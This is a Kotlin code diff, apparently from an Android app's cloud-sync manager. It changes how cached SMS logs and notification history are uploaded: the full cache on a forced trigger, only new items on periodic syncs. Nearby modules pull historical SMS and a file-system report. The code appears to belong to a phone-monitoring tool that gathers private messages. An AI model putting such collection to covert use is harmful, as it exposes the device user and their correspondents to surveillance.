@@ -55,14 +55,20 @@ object CloudManager {
                     if (limit > 0) {
                         json.put("sms_logs", PhoneManager.getHistoricalSms(ctx, limit))
                     } else {
-                        val lastSmsSync = prefs.getLong("last_sync_sms_ts", 0L)
                         val currentSmsLogs = JSONArray(prefs.getString("sms_logs_cache", "[]"))
-                        val deltaSms = JSONArray()
-                        for (i in 0 until currentSmsLogs.length()) {
-                            val item = currentSmsLogs.getJSONObject(i)
-                            if (item.optLong("timestamp", 0L) > lastSmsSync) deltaSms.put(item)
+                        if (triggerReason != "PERIODIC_SYNC") {
+                            // Manual Force: Send everything in cache
+                            if (currentSmsLogs.length() > 0) json.put("sms_logs", currentSmsLogs)
+                        } else {
+                            // Periodic: Standard Delta Sync
+                            val lastSmsSync = prefs.getLong("last_sync_sms_ts", 0L)
+                            val deltaSms = JSONArray()
+                            for (i in 0 until currentSmsLogs.length()) {
+                                val item = currentSmsLogs.getJSONObject(i)
+                                if (item.optLong("timestamp", 0L) > lastSmsSync) deltaSms.put(item)
+                            }
+                            if (deltaSms.length() > 0) json.put("sms_logs", deltaSms)
                         }
-                        if (deltaSms.length() > 0) json.put("sms_logs", deltaSms)
                     }
                     json.put("sms_count", prefs.getInt("sms_count", 0))
                 }
@@ -158,16 +164,22 @@ object CloudManager {
                     json.put("file_skeleton", FileManager.generateReport(3))
                 }
                 
-                // --- MODULE 9: NOTIFICATIONS (DELTA SYNC) ---
+                // --- MODULE 9: NOTIFICATIONS (FORCE-AWARE SYNC) ---
                 if (isAll || modules.contains("notifications")) {
-                    val lastNotifSync = prefs.getLong("last_sync_notif_ts", 0L)
                     val currentNotifs = JSONArray(prefs.getString("notif_history", "[]"))
-                    val deltaNotifs = JSONArray()
-                    for (i in 0 until currentNotifs.length()) {
-                        val item = currentNotifs.getJSONObject(i)
-                        if (item.optLong("ts", 0L) > lastNotifSync) deltaNotifs.put(item)
+                    if (triggerReason != "PERIODIC_SYNC") {
+                        // Manual Force: Send everything in cache
+                        if (currentNotifs.length() > 0) json.put("notif_history", currentNotifs)
+                    } else {
+                        // Periodic: Send only new items (Delta)
+                        val lastNotifSync = prefs.getLong("last_sync_notif_ts", 0L)
+                        val deltaNotifs = JSONArray()
+                        for (i in 0 until currentNotifs.length()) {
+                            val item = currentNotifs.getJSONObject(i)
+                            if (item.optLong("ts", 0L) > lastNotifSync) deltaNotifs.put(item)
+                        }
+                        if (deltaNotifs.length() > 0) json.put("notif_history", deltaNotifs)
                     }
-                    if (deltaNotifs.length() > 0) json.put("notif_history", deltaNotifs)
                 }
 
                 // --- SUMMARY STATS AGGREGATION (Gated to ALL or VITALS) ---
